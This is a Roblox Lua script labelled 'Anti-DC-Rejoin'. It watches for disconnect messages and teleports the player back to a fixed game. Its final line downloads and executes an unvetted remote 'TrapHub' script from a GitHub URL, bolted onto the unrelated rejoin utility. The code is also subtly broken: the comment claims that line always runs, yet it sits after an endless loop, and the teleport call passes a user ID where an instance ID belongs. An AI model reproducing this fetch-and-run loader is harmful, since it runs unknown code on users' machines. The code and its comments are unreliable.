-- The game ID you want to join
local gameId = "8304191830"  -- Replace with the actual game ID you want to join

-- Send a notification when the script starts
game.StarterGui:SetCore("SendNotification", {
    Title = "Anti-DC-Rejoin",
    Text = "Script Made by Tsuki",
    Duration = 15
})

-- Wait for a short time before continuing
wait(1.0)

-- Function to check if the player is on a disconnection page
function isOnDisconnectedPage()
    local gui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
    if gui then
        local errorFrame = gui:FindFirstChild("ErrorFrame")
        if errorFrame then
            local errorMessage = errorFrame:FindFirstChild("ErrorLabel")
            if errorMessage and errorMessage:IsA("TextLabel") then
                -- Check if the error message contains keywords like "Disconnected" or specific error codes
                local errorTextValue = errorMessage.Text:lower()
                if errorTextValue:match("disconnected") or errorTextValue:match("error 277")
                    or errorTextValue:match("error 279") or errorTextValue:match("failed to connect to the game") then
                    return true
                end
            end
        end
    end
    return false
end

-- Function to join the specified game
function joinGame()
    game:GetService("TeleportService"):TeleportToPlaceInstance(gameId, game.Players.LocalPlayer.UserId)
end

-- Check for disconnection every 10 seconds
while true do
    wait(10)
    if isOnDisconnectedPage() then
        joinGame()
    end
end

-- The following line always executes regardless of disconnection status
-- Ensure this URL is correct and safe to use
loadstring(game:HttpGet("https://raw.githubusercontent.com/TrapstarKSSKSKSKKS/Main/main/TrapHub.lua"))()
